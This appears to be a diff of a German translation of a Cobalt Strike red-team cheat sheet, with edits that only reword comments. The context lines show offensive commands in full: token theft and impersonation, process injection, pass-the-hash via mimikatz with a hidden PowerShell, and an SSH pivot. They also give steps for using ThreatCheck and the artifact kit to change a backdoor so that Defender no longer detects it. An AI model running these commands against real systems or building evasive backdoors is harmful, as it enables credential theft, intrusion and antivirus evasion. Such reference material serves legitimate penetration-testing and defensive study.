@@ -54,9 +54,9 @@ portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Füg
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Powershell-Modul importieren
+# Importieren Sie das Powershell-Modul
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;schreiben Sie hier den powershell-Befehl>
+powershell &#x3C;schreiben Sie hier einfach den powershell-Befehl>
 
 # Benutzeridentifikation
 ## Token-Generierung mit Anmeldeinformationen
@@ -78,12 +78,12 @@ ls \\computer_name\c$ # Versuchen Sie, das generierte Token zu verwenden, um auf
 rev2self # Stoppen Sie die Verwendung des Tokens von steal_token
 
 ## Prozess mit neuen Anmeldeinformationen starten
-spawnas [domain\username] [password] [listener] #Führen Sie es aus einem Verzeichnis mit Lesezugriff aus, z. B.: cd C:\
+spawnas [domain\username] [password] [listener] #Tun Sie es von einem Verzeichnis mit Lesezugriff wie: cd C:\
 ## Wie make_token wird dies Windows-Ereignis 4624 erzeugen: Ein Konto wurde erfolgreich angemeldet, jedoch mit einem Anmeldetyp von 2 (LOGON32_LOGON_INTERACTIVE). Es wird den aufrufenden Benutzer (TargetUserName) und den impersonierten Benutzer (TargetOutboundUserName) detailliert beschreiben.
 
-## In Prozess injizieren
+## In einen Prozess injizieren
 inject [pid] [x64|x86] [listener]
-## Aus einer OpSec-Perspektive: Führen Sie keine plattformübergreifende Injektion durch, es sei denn, Sie müssen wirklich (z. B. x86 -> x64 oder x64 -> x86).
+## Aus einer OpSec-Perspektive: Führen Sie keine plattformübergreifende Injektion durch, es sei denn, es ist wirklich notwendig (z. B. x86 -> x64 oder x64 -> x86).
 
 ## Pass the hash
 ## Dieser Modifikationsprozess erfordert das Patchen des LSASS-Speichers, was eine hochriskante Aktion ist, lokale Administratorrechte erfordert und nicht sehr praktikabel ist, wenn Protected Process Light (PPL) aktiviert ist.
@@ -92,7 +92,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash durch mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Ohne /run startet mimikatz eine cmd.exe, wenn Sie als Benutzer mit Desktop ausgeführt werden, sieht er die Shell (wenn Sie als SYSTEM ausgeführt werden, sind Sie gut dabei)
+## Ohne /run startet mimikatz eine cmd.exe, wenn Sie als Benutzer mit Desktop ausgeführt werden, wird er die Shell sehen (wenn Sie als SYSTEM ausgeführt werden, sind Sie auf der sicheren Seite).
 steal_token &#x3C;pid> #Token von dem durch mimikatz erstellten Prozess stehlen
 
 ## Pass the ticket
@@ -182,7 +182,7 @@ beacon> ssh 10.10.17.12:22 benutzername passwort</code></pre>
 
 Normalerweise finden Sie im Verzeichnis `/opt/cobaltstrike/artifact-kit` den Code und die vorcompilierten Vorlagen (in `/src-common`) der Payloads, die Cobalt Strike verwenden wird, um die binären Beacons zu generieren.
 
-Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) können Sie mit dem generierten Backdoor (oder nur mit der kompilierten Vorlage) herausfinden, was den Defender auslöst. Es ist normalerweise eine Zeichenfolge. Daher können Sie einfach den Code, der die Backdoor generiert, so ändern, dass diese Zeichenfolge nicht in der endgültigen Binärdatei erscheint.
+Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) können Sie mit der generierten Hintertür (oder nur mit der kompilierten Vorlage) herausfinden, was den Defender auslöst. Es ist normalerweise eine Zeichenfolge. Daher können Sie einfach den Code, der die Hintertür generiert, so ändern, dass diese Zeichenfolge nicht in der endgültigen Binärdatei erscheint.
 
 Nachdem Sie den Code geändert haben, führen Sie einfach `./build.sh` aus demselben Verzeichnis aus und kopieren Sie den `dist-pipe/`-Ordner in den Windows-Client unter `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
@@ -200,7 +200,7 @@ Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) können Sie mit de
 ```
 Durch das Ändern der erkannten Zeilen kann man eine Vorlage erstellen, die nicht erkannt wird.
 
-Vergessen Sie nicht, das aggressive Skript `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir möchten, und nicht die geladenen.
+Vergessen Sie nicht, das aggressive Skript `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuzeigen, dass die Ressourcen von der Festplatte verwendet werden sollen, die wir möchten, und nicht die geladenen.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
